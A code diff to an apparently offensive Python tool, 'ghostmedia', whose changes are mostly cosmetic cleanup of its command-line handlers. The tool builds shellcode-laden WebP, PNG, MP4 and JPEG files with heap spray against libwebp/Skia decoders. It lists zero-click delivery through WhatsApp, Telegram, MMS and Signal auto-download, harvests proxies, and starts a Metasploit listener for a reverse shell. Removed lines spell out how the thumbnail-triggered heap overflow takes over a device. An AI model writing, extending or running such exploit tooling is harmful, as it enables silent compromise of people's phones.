@@ -178,7 +178,6 @@ def handle_proxy_mode(args):
 
     harvester = ProxyHarvester(timeout=8, max_workers=30, debug=args.debug)
 
-    # Fetch based on type filter
     if args.proxy_type in ("http", "https", "all"):
         harvester.fetch_http()
     if args.proxy_type in ("socks4", "socks5", "all"):
@@ -186,12 +185,10 @@ def handle_proxy_mode(args):
 
     print_info(f"Fetched {len(harvester.proxies)} proxies total")
 
-    # Validate
     print_status(f"Validating proxies ({args.proxy_count} target, "
                  f"{harvester.max_workers} threads)...")
-    alive = harvester.validate_all(min_alive=args.proxy_count)
+    harvester.validate_all(min_alive=args.proxy_count)
 
-    # Filter by criteria
     filtered = harvester.filter(
         countries=args.proxy_country,
         min_anonymity=args.min_anonymity,
@@ -199,7 +196,6 @@ def handle_proxy_mode(args):
         proxy_type=None if args.proxy_type == "all" else args.proxy_type,
     )
 
-    # Display stats
     print()
     stats = harvester.stats()
     print_success(f"Results: {stats['total_alive']}/{stats['total_fetched']} alive "
@@ -208,7 +204,6 @@ def handle_proxy_mode(args):
     print_info(f"Avg latency: {stats.get('avg_latency_ms', 'N/A')}ms")
     print_info(f"Countries  : {', '.join(stats.get('countries', [])[:15])}")
 
-    # Top proxies table
     print()
     print(f"{'─' * 70}")
     print(f"{'#':<3} {'IP:Port':<24} {'Country':<8} {'Anonymity':<6} "
@@ -216,15 +211,13 @@ def handle_proxy_mode(args):
     print(f"{'─' * 70}")
 
     for i, p in enumerate(filtered[:20], 1):
-        flag = "✓" if p.alive else "✗"
         lat = f"{p.latency_ms:.0f}ms" if p.latency_ms else "N/A"
-        ssl_mark = "✓" if p.ssl else "—"
+        ssl_mark = "Y" if p.ssl else "N"
         print(f"{i:<3} {p.ip}:{p.port:<18} {p.country:<8} {p.anonymity:<6} "
               f"{p.proxy_type:<8} {ssl_mark:<4} {lat:<8} {p.score:.0f}")
 
     print(f"{'─' * 70}")
 
-    # Export if requested
     if args.export_proxies:
         fmt = args.export_proxies.lower()
         if fmt == "proxychains":
@@ -323,16 +316,15 @@ def handle_ai_mode(args):
         print_status(f"Testing TCP connection to {host}:{port}...")
         result = ai.test_connectivity(host, port)
         if result["reachable"]:
-            print_success(f"✓ Reachable — Latency: {result['latency_ms']}ms")
+            print_success(f"Reachable — Latency: {result['latency_ms']}ms")
         else:
-            print_error(f"✗ {result['error']}")
+            print_error(f"{result['error']}")
             if result.get("suggestion"):
-                print_info(f"→ {result['suggestion']}")
+                print_info(f"-> {result['suggestion']}")
 
 
 def handle_exploit_mode(args):
     """Handle exploit generation mode."""
-    # Validate inputs
     if not validate_ip(args.lhost):
         print_error(f"Invalid LHOST: {args.lhost}")
         sys.exit(1)
@@ -341,13 +333,11 @@ def handle_exploit_mode(args):
         print_error(f"Invalid LPORT: {args.lport}")
         sys.exit(1)
 
-    # Check dependencies
     print_status("Checking dependencies...")
     deps_ok = check_dependencies()
     if not deps_ok:
         print_warning("Some dependencies missing. Run: bash install.sh")
 
-    # Display target info
     device = SUPPORTED_DEVICES[args.target]
     print_info(f"Target Device : {args.target}")
     print_info(f"Chipset       : {device['chipset']}")
@@ -356,7 +346,6 @@ def handle_exploit_mode(args):
     print_info(f"libwebp       : {device['libwebp_version']}")
     print()
 
-    # Initialize payload builder
     builder = PayloadBuilder(
         lhost=args.lhost,
         lport=args.lport,
@@ -371,11 +360,9 @@ def handle_exploit_mode(args):
     shellcode = builder.build()
     print_success(f"Payload generated: {len(shellcode)} bytes")
 
-    # Determine output directory
     output_dir = args.output or f"ghostmedia_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
     os.makedirs(output_dir, exist_ok=True)
 
-    # Generate weaponized files
     formats_to_generate = ["webp", "png", "mp4", "jpeg"] if args.format == "all" else [args.format]
 
     results = {}
@@ -388,30 +375,22 @@ def handle_exploit_mode(args):
         try:
             if fmt == "webp":
                 result = webp_exploit.generate(
-                    shellcode=shellcode,
-                    output_path=output_path,
-                    heap_spray=args.heap_spray,
-                    spray_size=args.spray_size,
+                    shellcode=shellcode, output_path=output_path,
+                    heap_spray=args.heap_spray, spray_size=args.spray_size,
                     debug=args.debug
                 )
             elif fmt == "png":
                 result = png_exploit.generate(
-                    shellcode=shellcode,
-                    output_path=output_path,
-                    heap_spray=args.heap_spray,
-                    debug=args.debug
+                    shellcode=shellcode, output_path=output_path,
+                    heap_spray=args.heap_spray, debug=args.debug
                 )
             elif fmt == "mp4":
                 result = mp4_exploit.generate(
-                    shellcode=shellcode,
-                    output_path=output_path,
-                    debug=args.debug
+                    shellcode=shellcode, output_path=output_path, debug=args.debug
                 )
             elif fmt == "jpeg":
                 result = jpeg_exploit.generate(
-                    shellcode=shellcode,
-                    output_path=output_path,
-                    debug=args.debug
+                    shellcode=shellcode, output_path=output_path, debug=args.debug
                 )
 
             results[fmt] = result
@@ -427,31 +406,19 @@ def handle_exploit_mode(args):
                 import traceback
                 traceback.print_exc()
 
-    # Summary
     print()
     print("=" * 60)
     print_success(f"Generation complete! Files saved to: {output_dir}/")
     print("=" * 60)
     print()
-
     print_info("Delivery Methods:")
-    print("  • WhatsApp auto-download → thumbnail triggers exploit")
-    print("  • Telegram → media preview triggers exploit")
-    print("  • MMS → automatic download & gallery thumbnail")
-    print("  • Signal → auto-download media")
+    print("  • WhatsApp auto-download -> thumbnail triggers exploit")
+    print("  • Telegram -> media preview triggers exploit")
+    print("  • MMS -> automatic download & gallery thumbnail")
+    print("  • Signal -> auto-download media")
     print("  • Any app with media preview enabled")
     print()
 
-    print_info("How it works on target:")
-    print("  1. File arrives via messaging app")
-    print("  2. Auto-download saves to media folder")
-    print("  3. MediaScanner triggers thumbnail generation")
-    print("  4. libwebp/Skia decodes image → heap overflow")
-    print("  5. Shellcode executes → reverse shell to your listener")
-    print("  6. NO user interaction required — fully automatic")
-    print()
-
-    # Auto listener
     if args.auto_listener:
         print_status("Starting Metasploit listener...")
         msf_rc = os.path.join(output_dir, "listener.rc")
@@ -469,18 +436,15 @@ exploit -j
 
 def main():
     banner()
-
     args = parse_args()
 
-    # Determine operational mode
-    is_proxy_mode = any([args.fetch_proxies])
+    is_proxy_mode = args.fetch_proxies
     is_ai_mode = any([
         args.analyze_target, args.diagnose, args.full_diag,
         args.suggest_strategy, args.suggest_payload, args.test_connection
     ])
     is_exploit_mode = args.format is not None
 
-    # Execute modes (AI and proxy can run standalone or alongside exploit)
     if is_proxy_mode:
         handle_proxy_mode(args)
 
@@ -488,7 +452,6 @@ def main():
         handle_ai_mode(args)
 
     if is_exploit_mode:
-        # Validate exploit requirements
         if not args.lhost:
             print_error("--lhost is required for exploit generation")
             sys.exit(1)
@@ -497,7 +460,6 @@ def main():
             sys.exit(1)
         handle_exploit_mode(args)
 
-    # If no mode specified, show help
     if not is_proxy_mode and not is_ai_mode and not is_exploit_mode:
         print_warning("No action specified.")
         print_info("Choose a mode:")
